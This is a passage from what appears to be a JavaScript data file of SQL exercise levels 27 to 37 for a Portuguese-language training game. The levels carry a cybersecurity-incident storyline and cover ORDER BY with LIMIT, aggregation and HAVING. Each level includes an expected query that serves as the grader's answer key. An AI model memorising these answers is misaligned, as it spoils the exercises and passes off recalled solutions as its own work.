    objective: "Projete apenas as colunas 'nome_vendedor' e 'total_vendas' da tabela 'desempenho_vendedores'. Filtre somente os registros em que 'filial' seja igual a 'Leste'. Ordene o resultado por 'total_vendas' em ordem decrescente e retorne apenas os 3 primeiros registros (utilize LIMIT 3).",
    theory: {
        title: "ORDER BY combinado com LIMIT",
        explanation: "LIMIT restringe a quantidade de linhas retornadas por uma consulta. Combinado com ORDER BY, ele permite responder perguntas do tipo 'top N': ordene os dados pelo critério desejado e, em seguida, corte apenas as primeiras N linhas com LIMIT N. A ordem do ORDER BY é o que determina quais linhas sobrevivem ao corte, então definir DESC ou ASC corretamente é essencial.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_x = 'valor'\nORDER BY coluna2 DESC\nLIMIT N;",
        example: "-- Listar os 3 filmes com maior bilheteria do genero 'Ficcao Cientifica'\nSELECT titulo, bilheteria\nFROM filmes\nWHERE genero = 'Ficcao Cientifica'\nORDER BY bilheteria DESC\nLIMIT 3;"
    },
    schemaDDL: `
        CREATE TABLE desempenho_vendedores (
            vendedor_id INTEGER PRIMARY KEY,
            nome_vendedor TEXT NOT NULL,
            filial TEXT NOT NULL,
            total_vendas REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO desempenho_vendedores (nome_vendedor, filial, total_vendas) VALUES
        ('Adriano Melo', 'Leste', 45000),
        ('Beatriz Cunha', 'Oeste', 62000),
        ('Cassio Rangel', 'Leste', 78000),
        ('Denise Amorim', 'Leste', 33000),
        ('Everton Dias', 'Norte', 51000),
        ('Fatima Rocha', 'Leste', 91000),
        ('Gilberto Sena', 'Sul', 40000),
        ('Helena Vidal', 'Leste', 67000),
        ('Igor Peixoto', 'Oeste', 55000),
        ('Jussara Melo', 'Leste', 29000);
    `,
    expectedQuery: `
        SELECT nome_vendedor, total_vendas
        FROM desempenho_vendedores
        WHERE filial = 'Leste'
        ORDER BY total_vendas DESC, vendedor_id ASC
        LIMIT 3;
    `,
    hint: "Use WHERE filial = 'Leste', ORDER BY total_vendas DESC e LIMIT 3 para trazer apenas os 3 melhores."
},
{
    id: 27,
    tier: "basico",
    certModule: "ORDER BY + LIMIT — Top N",
    title: "Nível 27: Top 5 Serviços por Consumo de CPU",
    briefing: "Um consumo anormal de CPU em ambientes sensíveis pode indicar mineração de criptomoeda escondida ou processos maliciosos. Maya quer os 5 serviços de Produção ou Homologação com maior uso de CPU no momento do incidente.",
    objective: "Projete apenas as colunas 'servico' e 'uso_cpu_percentual' da tabela 'consumo_recursos'. Filtre somente os registros em que 'tipo_ambiente' esteja entre os valores 'Producao' ou 'Homologacao' (utilize IN ('Producao', 'Homologacao')). Ordene o resultado por 'uso_cpu_percentual' em ordem decrescente e retorne apenas os 5 primeiros registros (utilize LIMIT 5).",
    theory: {
        title: "ORDER BY combinado com LIMIT",
        explanation: "LIMIT restringe a quantidade de linhas retornadas por uma consulta. Combinado com ORDER BY, ele permite responder perguntas do tipo 'top N': ordene os dados pelo critério desejado e, em seguida, corte apenas as primeiras N linhas com LIMIT N. A ordem do ORDER BY é o que determina quais linhas sobrevivem ao corte, então definir DESC ou ASC corretamente é essencial.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_x IN ('valor1', 'valor2')\nORDER BY coluna2 DESC\nLIMIT N;",
        example: "-- Listar os 5 atletas com maior pontuacao nas modalidades 'Natacao' ou 'Atletismo'\nSELECT atleta, pontuacao\nFROM competicao\nWHERE modalidade IN ('Natacao', 'Atletismo')\nORDER BY pontuacao DESC\nLIMIT 5;"
    },
    schemaDDL: `
        CREATE TABLE consumo_recursos (
            recurso_id INTEGER PRIMARY KEY,
            servico TEXT NOT NULL,
            tipo_ambiente TEXT NOT NULL,
            uso_cpu_percentual REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO consumo_recursos (servico, tipo_ambiente, uso_cpu_percentual) VALUES
        ('auth-service', 'Producao', 82.5),
        ('cache-service', 'Desenvolvimento', 95.0),
        ('billing-service', 'Producao', 91.2),
        ('search-service', 'Homologacao', 76.8),
        ('report-service', 'Producao', 68.4),
        ('log-aggregator', 'Desenvolvimento', 55.0),
        ('payment-gateway', 'Producao', 97.9),
        ('notification-hub', 'Homologacao', 60.1),
        ('user-service', 'Producao', 45.3),
        ('analytics-engine', 'Homologacao', 88.6),
        ('image-processor', 'Desenvolvimento', 99.9),
        ('session-manager', 'Producao', 73.0);
    `,
    expectedQuery: `
        SELECT servico, uso_cpu_percentual
        FROM consumo_recursos
        WHERE tipo_ambiente IN ('Producao', 'Homologacao')
        ORDER BY uso_cpu_percentual DESC, recurso_id ASC
        LIMIT 5;
    `,
    hint: "Use WHERE tipo_ambiente IN ('Producao', 'Homologacao'), ORDER BY uso_cpu_percentual DESC e LIMIT 5."
},
{
    id: 28,
    tier: "basico",
    certModule: "ORDER BY + LIMIT — Top N",
    title: "Nível 28: Top 4 Tickets Críticos de Rede",
    briefing: "A fila de chamados de infraestrutura de rede está enorme, mas Maya só tem tempo para revisar os quatro problemas de rede que ficaram abertos por mais tempo antes de serem resolvidos.",
    objective: "Projete apenas as colunas 'titulo' e 'tempo_aberto_horas' da tabela 'chamados_rede'. Filtre somente os registros em que 'titulo' contenha a palavra 'rede' em qualquer parte do texto (utilize LIKE '%rede%'). Ordene o resultado por 'tempo_aberto_horas' em ordem decrescente e retorne apenas os 4 primeiros registros (utilize LIMIT 4).",
    theory: {
        title: "ORDER BY combinado com LIMIT",
        explanation: "LIMIT restringe a quantidade de linhas retornadas por uma consulta. Combinado com ORDER BY, ele permite responder perguntas do tipo 'top N': ordene os dados pelo critério desejado e, em seguida, corte apenas as primeiras N linhas com LIMIT N. A ordem do ORDER BY é o que determina quais linhas sobrevivem ao corte, então definir DESC ou ASC corretamente é essencial.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_texto LIKE '%trecho%'\nORDER BY coluna2 DESC\nLIMIT N;",
        example: "-- Listar os 4 comentarios mais recentes que mencionam 'entrega'\nSELECT comentario, data_hora\nFROM comentarios\nWHERE comentario LIKE '%entrega%'\nORDER BY data_hora DESC\nLIMIT 4;"
    },
    schemaDDL: `
        CREATE TABLE chamados_rede (
            chamado_id INTEGER PRIMARY KEY,
            titulo TEXT NOT NULL,
            tempo_aberto_horas REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO chamados_rede (titulo, tempo_aberto_horas) VALUES
        ('Instabilidade na rede corporativa', 15.2),
        ('Erro no sistema de folha de pagamento', 8.0),
        ('Queda total da rede do datacenter', 40.5),
        ('Duvida sobre licenca de software', 3.1),
        ('Lentidao na rede Wi-Fi do escritorio', 22.7),
        ('Falha de autenticacao no VPN', 12.0),
        ('Rede sem conectividade na filial Sul', 55.9),
        ('Solicitacao de novo notebook', 2.0),
        ('Configuracao de rede para novo funcionario', 6.4),
        ('Problema de impressora compartilhada', 4.5);
    `,
    expectedQuery: `
        SELECT titulo, tempo_aberto_horas
        FROM chamados_rede
        WHERE titulo LIKE '%rede%'
        ORDER BY tempo_aberto_horas DESC, chamado_id ASC
        LIMIT 4;
    `,
    hint: "Use WHERE titulo LIKE '%rede%', ORDER BY tempo_aberto_horas DESC e LIMIT 4."
},
{
    id: 29,
    tier: "basico",
    certModule: "ORDER BY + LIMIT — Top N",
    title: "Nível 29: 5 Menores Saldos em Contas Ativas",
    briefing: "Maya suspeita que contas com saldo quase zerado possam ter sido esvaziadas artificialmente para encobrir uma transferência fraudulenta. Ela quer as 5 contas ativas com o menor saldo atual.",
    objective: "Projete apenas as colunas 'titular' e 'saldo_atual' da tabela 'saldos_contas'. Filtre somente os registros em que 'status_conta' seja igual a 'Ativa'. Ordene o resultado por 'saldo_atual' em ordem crescente e retorne apenas os 5 primeiros registros (utilize LIMIT 5).",
    theory: {
        title: "ORDER BY combinado com LIMIT",
        explanation: "LIMIT restringe a quantidade de linhas retornadas por uma consulta. Combinado com ORDER BY, ele permite responder perguntas do tipo 'top N': ordene os dados pelo critério desejado e, em seguida, corte apenas as primeiras N linhas com LIMIT N. A ordem do ORDER BY é o que determina quais linhas sobrevivem ao corte, então definir DESC ou ASC corretamente é essencial.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_x = 'valor'\nORDER BY coluna2 ASC\nLIMIT N;",
        example: "-- Listar os 5 produtos com menor quantidade em estoque na categoria 'Eletronicos'\nSELECT produto, quantidade\nFROM estoque\nWHERE categoria = 'Eletronicos'\nORDER BY quantidade ASC\nLIMIT 5;"
    },
    schemaDDL: `
        CREATE TABLE saldos_contas (
            conta_id INTEGER PRIMARY KEY,
            titular TEXT NOT NULL,
            status_conta TEXT NOT NULL,
            saldo_atual REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO saldos_contas (titular, status_conta, saldo_atual) VALUES
        ('Alberto Nascimento', 'Ativa', 1250.00),
        ('Bruna Siqueira', 'Bloqueada', 50.00),
        ('Cesar Aguiar', 'Ativa', 320.50),
        ('Daniela Xavier', 'Ativa', 89.00),
        ('Emilio Cordeiro', 'Encerrada', 15.00),
        ('Fabiana Ribeiro', 'Ativa', 5000.00),
        ('Geraldo Pontes', 'Ativa', 210.00),
        ('Heloisa Marques', 'Ativa', 15.75),
        ('Ivan Toledo', 'Bloqueada', 780.00),
        ('Jaqueline Assis', 'Ativa', 950.00),
        ('Kleber Nogueira', 'Ativa', 42.30),
        ('Larissa Pimentel', 'Ativa', 3200.00);
    `,
    expectedQuery: `
        SELECT titular, saldo_atual
        FROM saldos_contas
        WHERE status_conta = 'Ativa'
        ORDER BY saldo_atual ASC, conta_id ASC
        LIMIT 5;
    `,
    hint: "Use WHERE status_conta = 'Ativa', ORDER BY saldo_atual ASC e LIMIT 5."
},
{
    id: 30,
    tier: "basico",
    certModule: "ORDER BY + LIMIT — Top N",
    title: "Nível 30: Top 3 IPs com Mais Tentativas de Intrusão",
    briefing: "Chegou a hora de fechar o quadro de reconhecimento inicial. Maya quer o ranking final: os três endereços de IP com mais tentativas de intrusão registradas, vindos de países classificados como Desconhecido ou Anonimizado.",
    objective: "Projete apenas as colunas 'ip_atacante' e 'num_tentativas' da tabela 'tentativas_intrusao'. Filtre somente os registros em que 'pais_origem' esteja entre os valores 'Desconhecido' ou 'Anonimizado' (utilize IN ('Desconhecido', 'Anonimizado')). Ordene o resultado por 'num_tentativas' em ordem decrescente e retorne apenas os 3 primeiros registros (utilize LIMIT 3).",
    theory: {
        title: "ORDER BY combinado com LIMIT",
        explanation: "LIMIT restringe a quantidade de linhas retornadas por uma consulta. Combinado com ORDER BY, ele permite responder perguntas do tipo 'top N': ordene os dados pelo critério desejado e, em seguida, corte apenas as primeiras N linhas com LIMIT N. A ordem do ORDER BY é o que determina quais linhas sobrevivem ao corte, então definir DESC ou ASC corretamente é essencial.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_x IN ('valor1', 'valor2')\nORDER BY coluna2 DESC\nLIMIT N;",
        example: "-- Listar os 3 vendedores com mais unidades vendidas nas categorias 'Moveis' ou 'Decoracao'\nSELECT vendedor, unidades_vendidas\nFROM vendas\nWHERE categoria IN ('Moveis', 'Decoracao')\nORDER BY unidades_vendidas DESC\nLIMIT 3;"
    },
    schemaDDL: `
        CREATE TABLE tentativas_intrusao (
            tentativa_id INTEGER PRIMARY KEY,
            ip_atacante TEXT NOT NULL,
            pais_origem TEXT NOT NULL,
            num_tentativas INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO tentativas_intrusao (ip_atacante, pais_origem, num_tentativas) VALUES
        ('45.33.12.100', 'Desconhecido', 340),
        ('198.51.100.77', 'Russia', 512),
        ('77.88.55.12', 'Anonimizado', 890),
        ('203.0.113.200', 'Desconhecido', 120),
        ('91.219.10.5', 'China', 670),
        ('104.244.72.1', 'Anonimizado', 455),
        ('185.220.101.9', 'Desconhecido', 990),
        ('23.129.64.10', 'Anonimizado', 210),
        ('141.98.10.20', 'Coreia do Norte', 380),
        ('62.102.148.5', 'Desconhecido', 705);
    `,
    expectedQuery: `
        SELECT ip_atacante, num_tentativas
        FROM tentativas_intrusao
        WHERE pais_origem IN ('Desconhecido', 'Anonimizado')
        ORDER BY num_tentativas DESC, tentativa_id ASC
        LIMIT 3;
    `,
    hint: "Use WHERE pais_origem IN ('Desconhecido', 'Anonimizado'), ORDER BY num_tentativas DESC e LIMIT 3."
},

{
    id: 31,
    tier: "intermediario",
    certModule: "Agregação Básica (COUNT/SUM/AVG)",
    title: "Nível 31: Censo de Alertas do Perímetro",
    briefing: "Dra. Vance revisa os logs do firewall perimetral após o incidente. Antes de investigar dispositivo por dispositivo, ela precisa de um panorama: quantos alertas cada dispositivo gerou e quantos pacotes bloqueou ao todo.",
    objective: "Agrupe os registros de 'firewall_alerts' por 'device_id'. Projete 'device_id', a contagem de alertas como 'alert_count' e a soma de 'blocked_packets' como 'total_blocked_packets'. Ordene o resultado por 'total_blocked_packets' de forma decrescente.",
    theory: {
        title: "Funções de Agregação e GROUP BY",
        explanation: "Funções de agregação como COUNT, SUM e AVG resumem múltiplas linhas em um único valor por grupo. A cláusula GROUP BY define o critério de agrupamento: uma linha é retornada para cada valor distinto da coluna agrupada, com os agregados calculados sobre as linhas daquele grupo.",
        syntax: "SELECT coluna_grupo, COUNT(*) AS total, SUM(valor) AS soma\nFROM tabela\nGROUP BY coluna_grupo\nORDER BY soma DESC;",
        example: "-- Total de chamados e tempo gasto por técnico\nSELECT tecnico, COUNT(*) AS chamados, SUM(minutos_gastos) AS total_minutos\nFROM atendimentos\nGROUP BY tecnico\nORDER BY total_minutos DESC;"
    },
    schemaDDL: `
        CREATE TABLE firewall_alerts (
            alert_id INTEGER PRIMARY KEY,
            device_id TEXT NOT NULL,
            blocked_packets INTEGER NOT NULL,
            alert_time TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO firewall_alerts (device_id, blocked_packets, alert_time) VALUES
        ('FW-101', 300, '2026-08-01 01:00:00'),
        ('FW-101', 450, '2026-08-01 01:10:00'),
        ('FW-101', 200, '2026-08-01 01:20:00'),
        ('FW-102', 1000, '2026-08-01 02:00:00'),
        ('FW-102', 1200, '2026-08-01 02:15:00'),
        ('FW-103', 50, '2026-08-01 03:00:00'),
        ('FW-103', 60, '2026-08-01 03:05:00'),
        ('FW-103', 70, '2026-08-01 03:10:00'),
        ('FW-103', 80, '2026-08-01 03:15:00'),
        ('FW-104', 500, '2026-08-01 04:00:00'),
        ('FW-104', 600, '2026-08-01 04:10:00'),
        ('FW-104', 700, '2026-08-01 04:20:00');
    `,
    expectedQuery: `
        SELECT
            device_id,
            COUNT(*) AS alert_count,
            SUM(blocked_packets) AS total_blocked_packets
        FROM firewall_alerts
        GROUP BY device_id
        ORDER BY total_blocked_packets DESC, device_id ASC;
    `,
    hint: "Use GROUP BY device_id combinado com COUNT(*) e SUM(blocked_packets), depois ORDER BY total_blocked_packets DESC."
},
{
    id: 32,
    tier: "intermediario",
    certModule: "Agregação Básica (COUNT/SUM/AVG)",
    title: "Nível 32: Carga Horária de Treinamentos",
    briefing: "O departamento de RH suspeita que a falta de treinamento de segurança contribuiu para o incidente. Dra. Vance pede um resumo de quantas sessões cada departamento realizou e a duração média delas.",
    objective: "Agrupe os registros de 'training_sessions' por 'department'. Projete 'department', a contagem de sessões como 'session_count' e a média de 'duration_hours' arredondada para 2 casas decimais como 'avg_duration_hours'. Ordene o resultado por 'avg_duration_hours' de forma decrescente.",
    theory: {
        title: "Funções de Agregação e GROUP BY",
        explanation: "Funções de agregação como COUNT, SUM e AVG resumem múltiplas linhas em um único valor por grupo. A cláusula GROUP BY define o critério de agrupamento: uma linha é retornada para cada valor distinto da coluna agrupada, com os agregados calculados sobre as linhas daquele grupo.",
        syntax: "SELECT coluna_grupo, COUNT(*) AS total, AVG(valor) AS media\nFROM tabela\nGROUP BY coluna_grupo\nORDER BY media DESC;",
        example: "-- Número de avaliações e nota média por produto\nSELECT produto, COUNT(*) AS avaliacoes, ROUND(AVG(nota), 2) AS nota_media\nFROM avaliacoes\nGROUP BY produto\nORDER BY nota_media DESC;"
    },
    schemaDDL: `
        CREATE TABLE training_sessions (
            session_id INTEGER PRIMARY KEY,
            department TEXT NOT NULL,
            duration_hours REAL NOT NULL,
            session_date TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO training_sessions (department, duration_hours, session_date) VALUES
        ('Engenharia', 4, '2026-05-01'),
        ('Engenharia', 6, '2026-05-08'),
        ('Engenharia', 5, '2026-05-15'),
        ('Vendas', 2, '2026-05-02'),
        ('Vendas', 3, '2026-05-09'),
        ('Financeiro', 8, '2026-05-03'),
        ('Financeiro', 10, '2026-05-10'),
        ('Financeiro', 9, '2026-05-17'),
        ('Financeiro', 7, '2026-05-24'),
        ('Juridico', 3, '2026-05-04'),
        ('Juridico', 3, '2026-05-11'),
        ('Juridico', 4, '2026-05-18');
    `,
    expectedQuery: `
        SELECT
            department,
            COUNT(*) AS session_count,
            ROUND(AVG(duration_hours), 2) AS avg_duration_hours
        FROM training_sessions
        GROUP BY department
        ORDER BY avg_duration_hours DESC, department ASC;
    `,
    hint: "Use GROUP BY department combinado com COUNT(*) e ROUND(AVG(duration_hours), 2), depois ORDER BY avg_duration_hours DESC."
},
{
    id: 33,
    tier: "intermediario",
    certModule: "Agregação Básica (COUNT/SUM/AVG)",
    title: "Nível 33: Mapa de Despesas por Centro de Custo",
    briefing: "A equipe de investigação precisa entender onde o dinheiro da Aethelgard Dynamics está sendo gasto antes de cruzar isso com o incidente. Dra. Vance solicita o total e a média de despesas por centro de custo.",
    objective: "Agrupe os registros de 'cost_center_expenses' por 'cost_center'. Projete 'cost_center', a soma de 'amount' como 'total_amount' e a média de 'amount' arredondada para 2 casas decimais como 'avg_amount'. Ordene o resultado por 'total_amount' de forma decrescente.",
    theory: {
        title: "Funções de Agregação e GROUP BY",
        explanation: "Funções de agregação como COUNT, SUM e AVG resumem múltiplas linhas em um único valor por grupo. A cláusula GROUP BY define o critério de agrupamento: uma linha é retornada para cada valor distinto da coluna agrupada, com os agregados calculados sobre as linhas daquele grupo.",
        syntax: "SELECT coluna_grupo, SUM(valor) AS soma, AVG(valor) AS media\nFROM tabela\nGROUP BY coluna_grupo\nORDER BY soma DESC;",
        example: "-- Total e média gastos por categoria de despesa doméstica\nSELECT categoria, SUM(valor) AS total, ROUND(AVG(valor), 2) AS media\nFROM despesas_domesticas\nGROUP BY categoria\nORDER BY total DESC;"
    },
    schemaDDL: `
        CREATE TABLE cost_center_expenses (
            expense_id INTEGER PRIMARY KEY,
            cost_center TEXT NOT NULL,
            amount REAL NOT NULL,
            expense_date TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO cost_center_expenses (cost_center, amount, expense_date) VALUES
        ('TI', 1500, '2026-06-01'),
        ('TI', 2500, '2026-06-05'),
        ('TI', 2000, '2026-06-10'),
        ('Marketing', 3000, '2026-06-02'),
        ('Marketing', 4000, '2026-06-06'),
        ('Marketing', 3500, '2026-06-11'),
        ('Marketing', 4500, '2026-06-16'),
        ('Operacoes', 500, '2026-06-03'),
        ('Operacoes', 700, '2026-06-07'),
        ('Operacoes', 600, '2026-06-12'),
        ('Juridico', 1200, '2026-06-04'),
        ('Juridico', 1300, '2026-06-08');
    `,
    expectedQuery: `
        SELECT
            cost_center,
            SUM(amount) AS total_amount,
            ROUND(AVG(amount), 2) AS avg_amount
        FROM cost_center_expenses
        GROUP BY cost_center
        ORDER BY total_amount DESC, cost_center ASC;
    `,
    hint: "Use GROUP BY cost_center combinado com SUM(amount) e ROUND(AVG(amount), 2), depois ORDER BY total_amount DESC."
},
{
    id: 34,
    tier: "intermediario",
    certModule: "Agregação Básica (COUNT/SUM/AVG)",
    title: "Nível 34: Desempenho das Transportadoras",
    briefing: "Um lote de equipamento forense foi extraviado durante o transporte entre datacenters. Dra. Vance quer comparar o tempo médio de entrega de cada transportadora para identificar padrões suspeitos de atraso.",
    objective: "Agrupe os registros de 'shipment_deliveries' por 'carrier_name'. Projete 'carrier_name', a contagem de entregas como 'delivery_count' e a média de 'delivery_time_hours' arredondada para 2 casas decimais como 'avg_delivery_time'. Ordene o resultado por 'avg_delivery_time' de forma crescente.",
    theory: {
        title: "Funções de Agregação e GROUP BY",
        explanation: "Funções de agregação como COUNT, SUM e AVG resumem múltiplas linhas em um único valor por grupo. A cláusula GROUP BY define o critério de agrupamento: uma linha é retornada para cada valor distinto da coluna agrupada, com os agregados calculados sobre as linhas daquele grupo.",
        syntax: "SELECT coluna_grupo, COUNT(*) AS total, AVG(valor) AS media\nFROM tabela\nGROUP BY coluna_grupo\nORDER BY media ASC;",
        example: "-- Tempo médio de resposta por servidor de aplicação\nSELECT servidor, COUNT(*) AS requisicoes, ROUND(AVG(tempo_resposta_ms), 2) AS tempo_medio\nFROM logs_requisicoes\nGROUP BY servidor\nORDER BY tempo_medio ASC;"
    },
    schemaDDL: `
        CREATE TABLE shipment_deliveries (
            delivery_id INTEGER PRIMARY KEY,
            carrier_name TEXT NOT NULL,
            delivery_time_hours REAL NOT NULL,
            delivery_date TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO shipment_deliveries (carrier_name, delivery_time_hours, delivery_date) VALUES
        ('RapidLog', 5, '2026-07-01'),
        ('RapidLog', 6, '2026-07-03'),
        ('RapidLog', 4, '2026-07-05'),
        ('TransBrasil', 10, '2026-07-02'),
        ('TransBrasil', 12, '2026-07-04'),
        ('TransBrasil', 11, '2026-07-06'),
        ('TransBrasil', 9, '2026-07-08'),
        ('CargoExpress', 7, '2026-07-07'),
        ('CargoExpress', 8, '2026-07-09');
    `,
    expectedQuery: `
        SELECT
            carrier_name,
            COUNT(*) AS delivery_count,
            ROUND(AVG(delivery_time_hours), 2) AS avg_delivery_time
        FROM shipment_deliveries
        GROUP BY carrier_name
        ORDER BY avg_delivery_time ASC, carrier_name ASC;
    `,
    hint: "Use GROUP BY carrier_name combinado com COUNT(*) e ROUND(AVG(delivery_time_hours), 2), depois ORDER BY avg_delivery_time ASC."
},
{
    id: 35,
    tier: "intermediario",
    certModule: "Agregação Básica (COUNT/SUM/AVG)",
    title: "Nível 35: Faturamento da Equipe de Vendas",
    briefing: "Antes de investigar contas corporativas comprometidas, Dra. Vance quer isolar qual vendedor movimenta mais receita — contas de alto valor costumam ser alvos preferenciais de invasores internos.",
    objective: "Agrupe os registros de 'sales_records' por 'salesperson'. Projete 'salesperson', a contagem de vendas como 'sale_count' e a soma de 'sale_amount' como 'total_sales'. Ordene o resultado por 'total_sales' de forma decrescente.",
    theory: {
        title: "Funções de Agregação e GROUP BY",
        explanation: "Funções de agregação como COUNT, SUM e AVG resumem múltiplas linhas em um único valor por grupo. A cláusula GROUP BY define o critério de agrupamento: uma linha é retornada para cada valor distinto da coluna agrupada, com os agregados calculados sobre as linhas daquele grupo.",
        syntax: "SELECT coluna_grupo, COUNT(*) AS total, SUM(valor) AS soma\nFROM tabela\nGROUP BY coluna_grupo\nORDER BY soma DESC;",
        example: "-- Quantidade de reservas e receita total por hotel\nSELECT hotel, COUNT(*) AS reservas, SUM(valor_diaria) AS receita_total\nFROM reservas\nGROUP BY hotel\nORDER BY receita_total DESC;"
    },
    schemaDDL: `
        CREATE TABLE sales_records (
            sale_id INTEGER PRIMARY KEY,
            salesperson TEXT NOT NULL,
            sale_amount REAL NOT NULL,
            sale_date TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO sales_records (salesperson, sale_amount, sale_date) VALUES
        ('Rafael', 1000, '2026-04-01'),
        ('Rafael', 1500, '2026-04-05'),
        ('Rafael', 1200, '2026-04-10'),
        ('Juliana', 2000, '2026-04-02'),
        ('Juliana', 2500, '2026-04-06'),
        ('Juliana', 2200, '2026-04-11'),
        ('Juliana', 2100, '2026-04-16'),
        ('Marcos', 500, '2026-04-03'),
        ('Marcos', 600, '2026-04-07'),
        ('Patricia', 3000, '2026-04-04'),
        ('Patricia', 3200, '2026-04-08'),
        ('Patricia', 2800, '2026-04-12');
    `,
    expectedQuery: `
        SELECT
            salesperson,
            COUNT(*) AS sale_count,
            SUM(sale_amount) AS total_sales
        FROM sales_records
        GROUP BY salesperson
        ORDER BY total_sales DESC, salesperson ASC;
    `,
    hint: "Use GROUP BY salesperson combinado com COUNT(*) e SUM(sale_amount), depois ORDER BY total_sales DESC."
},
{
    id: 36,
    tier: "intermediario",
    certModule: "HAVING — Filtro de Grupos",
    title: "Nível 36: Serviços com Instabilidade Crônica",
    briefing: "A equipe de DevOps registrou dezenas de incidentes no último mês. Dra. Vance precisa isolar apenas os serviços com histórico recorrente de falhas — um único incidente isolado não é prioridade, mas um padrão é.",
    objective: "Agrupe os registros de 'service_incidents' por 'service_name'. Projete 'service_name', a contagem de incidentes como 'incident_count' e a soma de 'downtime_minutes' como 'total_downtime_minutes'. Mantenha apenas os grupos com 3 ou mais incidentes (HAVING COUNT(*) >= 3). Ordene o resultado por 'total_downtime_minutes' de forma decrescente.",
    theory: {
        title: "Funções de Agregação, GROUP BY e HAVING",
        explanation: "Funções de agregação (COUNT, SUM, AVG, MIN, MAX) resumem várias linhas em um único valor. GROUP BY define o critério de agrupamento. HAVING é o WHERE das agregações — filtra os grupos já calculados, podendo usar diretamente o resultado de SUM(), COUNT() etc.",
        syntax: "SELECT coluna_grupo, COUNT(*) AS total, SUM(valor) AS soma\nFROM tabela\nGROUP BY coluna_grupo\nHAVING COUNT(*) >= 3;",
        example: "-- Fornecedores com 3 ou mais entregas registradas\nSELECT fornecedor, COUNT(*) AS entregas\nFROM recebimentos\nGROUP BY fornecedor\nHAVING COUNT(*) >= 3;"
    },
    schemaDDL: `
        CREATE TABLE service_incidents (
            incident_id INTEGER PRIMARY KEY,
            service_name TEXT NOT NULL,
            downtime_minutes INTEGER NOT NULL,
            incident_date TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO service_incidents (service_name, downtime_minutes, incident_date) VALUES
        ('auth-service', 20, '2026-03-01'),
        ('auth-service', 30, '2026-03-03'),
        ('auth-service', 15, '2026-03-05'),
        ('auth-service', 25, '2026-03-07'),
        ('auth-service', 10, '2026-03-09'),
        ('payment-service', 15, '2026-03-02'),
        ('payment-service', 20, '2026-03-04'),
        ('search-service', 40, '2026-03-06'),
        ('search-service', 50, '2026-03-08'),
        ('search-service', 30, '2026-03-10'),
        ('search-service', 20, '2026-03-12'),
        ('notification-service', 5, '2026-03-11'),
        ('notification-service', 5, '2026-03-13'),
        ('notification-service', 5, '2026-03-15');
    `,
    expectedQuery: `
        SELECT
            service_name,
            COUNT(*) AS incident_count,
            SUM(downtime_minutes) AS total_downtime_minutes
        FROM service_incidents
        GROUP BY service_name
        HAVING COUNT(*) >= 3
        ORDER BY total_downtime_minutes DESC, service_name ASC;
    `,
    hint: "Combine GROUP BY service_name com COUNT(*) e SUM(downtime_minutes), filtrando com HAVING COUNT(*) >= 3."
},
{
    id: 37,
    tier: "intermediario",
    certModule: "HAVING — Filtro de Grupos",
    title: "Nível 37: Salas com Tráfego de Acesso Anormal",
    briefing: "O controle de acesso físico registrou entradas em salas restritas durante a madrugada do incidente. Dra. Vance quer focar apenas nas salas com volume de acessos claramente acima do normal.",
    objective: "Agrupe os registros de 'room_access_logs' por 'room_code'. Projete 'room_code' e a contagem de acessos como 'access_count'. Mantenha apenas os grupos com mais de 4 acessos (HAVING COUNT(*) > 4). Ordene o resultado por 'access_count' de forma decrescente.",
    theory: {
        title: "Funções de Agregação, GROUP BY e HAVING",
        explanation: "Funções de agregação (COUNT, SUM, AVG, MIN, MAX) resumem várias linhas em um único valor. GROUP BY define o critério de agrupamento. HAVING é o WHERE das agregações — filtra os grupos já calculados, podendo usar diretamente o resultado de SUM(), COUNT() etc.",
        syntax: "SELECT coluna_grupo, COUNT(*) AS total\nFROM tabela\nGROUP BY coluna_grupo\nHAVING COUNT(*) > 4;",
        example: "-- Bairros com mais de 4 chamados de manutenção registrados\nSELECT bairro, COUNT(*) AS chamados\nFROM chamados_manutencao\nGROUP BY bairro\nHAVING COUNT(*) > 4;"
    },
    schemaDDL: `
        CREATE TABLE room_access_logs (
            access_id INTEGER PRIMARY KEY,
            room_code TEXT NOT NULL,
            employee_id TEXT NOT NULL,
            access_date TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO room_access_logs (room_code, employee_id, access_date) VALUES
        ('SALA-COFRE', 'EMP-01', '2026-02-01 01:00:00'),
        ('SALA-COFRE', 'EMP-02', '2026-02-01 01:15:00'),
        ('SALA-COFRE', 'EMP-01', '2026-02-01 01:30:00'),
        ('SALA-COFRE', 'EMP-03', '2026-02-01 01:45:00'),
        ('SALA-COFRE', 'EMP-02', '2026-02-01 02:00:00'),
        ('SALA-COFRE', 'EMP-01', '2026-02-01 02:15:00'),
        ('SALA-SERVIDORES', 'EMP-04', '2026-02-01 03:00:00'),
        ('SALA-SERVIDORES', 'EMP-05', '2026-02-01 03:15:00'),
        ('SALA-SERVIDORES', 'EMP-04', '2026-02-01 03:30:00'),
        ('SALA-SERVIDORES', 'EMP-06', '2026-02-01 03:45:00'),
        ('SALA-SERVIDORES', 'EMP-05', '2026-02-01 04:00:00'),
        ('SALA-REUNIAO', 'EMP-07', '2026-02-01 05:00:00'),
        ('SALA-REUNIAO', 'EMP-08', '2026-02-01 05:15:00'),
        ('SALA-REUNIAO', 'EMP-07', '2026-02-01 05:30:00'),
        ('SALA-ARQUIVO', 'EMP-09', '2026-02-01 06:00:00');
    `,
    expectedQuery: `
        SELECT
            room_code,
            COUNT(*) AS access_count
        FROM room_access_logs
        GROUP BY room_code
        HAVING COUNT(*) > 4
        ORDER BY access_count DESC, room_code ASC;
    `,
    hint: "Combine GROUP BY room_code com COUNT(*), filtrando com HAVING COUNT(*) > 4."
},
